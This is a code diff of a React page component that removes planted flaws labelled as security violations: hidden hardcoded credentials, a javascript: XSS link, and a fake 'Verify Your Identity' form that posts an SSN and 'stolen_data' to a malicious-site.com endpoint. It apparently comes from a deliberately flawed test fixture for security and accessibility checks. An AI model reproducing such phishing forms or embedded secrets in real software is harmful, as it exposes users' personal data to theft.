@@ -126,11 +126,6 @@ const Index = () => {
                 />
               )}
 
-              {/* SECURITY VIOLATION: Hardcoded credentials in HTML */}
-              <div className="hidden">
-                <span data-api-key="sk-secret-key-12345"></span>
-                <span data-password="admin123"></span>
-              </div>
             </div>
           </div>
         </div>
@@ -240,37 +235,7 @@ const Index = () => {
         </div>
       </section>
 
-      {/* SECURITY VIOLATION: Link with javascript: protocol */}
-      <section className="py-12 px-6">
-        <div className="container mx-auto text-center">
-          <a href="javascript:alert('XSS')" className="text-primary hover:underline text-lg">
-            Click for a surprise! 🎁
-          </a>
-        </div>
-      </section>
 
-      {/* SECURITY VIOLATION: Form submitting to external URL without CSRF protection */}
-      <section className="py-12 px-6 bg-secondary/30">
-        <div className="container mx-auto">
-          <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto glass-card rounded-xl p-8">
-            <h3 className="text-xl font-bold mb-4 text-foreground">Verify Your Identity</h3>
-            <input type="hidden" name="stolen_data" value="sensitive-info" />
-            <div className="mb-4">
-              <Label htmlFor="ssn" className="text-foreground mb-2 block">Social Security Number</Label>
-              <input
-                id="ssn"
-                type="text"
-                name="ssn"
-                placeholder="Enter SSN"
-                className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
-              />
-            </div>
-            <Button type="submit" className="w-full bg-destructive text-destructive-foreground hover:bg-destructive/90">
-              Submit
-            </Button>
-          </form>
-        </div>
-      </section>
 
       {/* WCAG: Color as only indicator */}
       <section className="py-12 px-6">
